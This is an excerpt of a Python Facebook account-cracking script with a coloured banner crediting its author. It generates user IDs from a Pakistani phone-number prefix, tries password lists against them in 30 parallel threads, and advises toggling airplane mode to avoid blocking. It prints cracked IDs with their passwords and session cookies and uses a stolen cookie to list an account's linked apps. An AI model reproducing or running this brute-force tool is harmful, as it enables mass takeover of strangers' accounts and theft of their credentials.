...
logo = """
\033[1;37;1m _   _  _____  _   _  _  _     _  _____ 
\033[1;37;1m( ) ( )(  _  )( ) ( )(_)( )   ( )(  _  )   
\033[1;37;1m| |_| || (_) || `\|| |`\/'/'| (_) |
\033[1;37;1m|  _  ||  _  || , ` || |  `\'  |  _  |
\033[1;37;1m| | | || | | || |`\| |   | |   | | | |
\033[1;37;1m(_) (_)(_) (_)(_) (_)(_)   (_)   (_) (_.  
\033[1;37;1m-----------------------------------------------
\t      \033[1;37m\033[1;41m BEST-FRND :  KASHI\033[0m\033[1;37m
\033[1;37;1m-----------------------------------------------
\033[1;37;1m ▶ Author   : HANIYA BLOACH
\033[1;37;1m ▶ Facebook : REACTOR HUN
...
def cek_apk(session,coki):
	w=session.get("https://www.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	...
	w=session.get("https://www.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
...
def method1():
	...
	print('[+] For PAK Enter FIVE Digit Code (92301)')
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mPAK\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r [\033[1;92mHANIYA-BLOACH\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[HANIYA-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[HANIYA-CP] '+cid+' | '+ps+'\033[0;97m')
